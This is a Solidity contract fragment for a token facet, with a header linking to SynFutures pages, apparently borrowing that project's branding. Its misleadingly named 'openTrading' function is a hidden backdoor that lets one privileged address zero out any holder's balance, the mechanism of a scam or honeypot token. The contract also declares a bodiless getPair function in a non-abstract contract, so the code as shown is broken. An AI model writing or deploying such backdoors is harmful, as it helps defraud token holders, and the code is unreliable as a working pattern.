/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.synfutures.com/
 * Whitepaper: https://www.synfutures.com/v3-whitepaper.pdf
 * Twitter: https://twitter.com/SynFuturesDefi
 * Telegram Group: https://t.me/synfutures_Defi
 * Discord Chat: https://discord.com/invite/qMX2kcQk7A
 * Medium: https://medium.com/synfutures
 */
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function pancakePair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IPancakeFactory(ds.FACTORY).getPair(
                address(ds.WETH),
                address(this)
            );
    }
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ds.ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
}
